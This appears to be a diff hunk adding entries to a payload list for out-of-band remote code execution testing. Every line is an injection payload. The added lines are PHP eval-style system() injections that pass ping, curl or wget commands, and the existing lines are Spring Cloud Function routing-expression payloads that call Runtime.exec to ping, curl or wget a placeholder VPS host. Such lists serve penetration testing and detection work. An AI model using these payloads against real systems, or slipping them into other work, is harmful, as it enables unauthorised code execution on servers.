@@ -1,3 +1,9 @@
+${system($_GET[0])}&0=ping domain_collab /;
+${system($_GET[0])}&0=curl domain_collab /;
+${system($_GET[0])}&0=wget domain_collab /;
+${system($_GET[0])}&0=ping vps_ip /;
+${system($_GET[0])}&0=curl vps_ip /;
+${system($_GET[0])}&0=wget vps_ip /;
 spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("ping vps_ip")
 spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl vps_ip:80/curl_s4s")
 spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget vps_ip:80/wget_s4s")
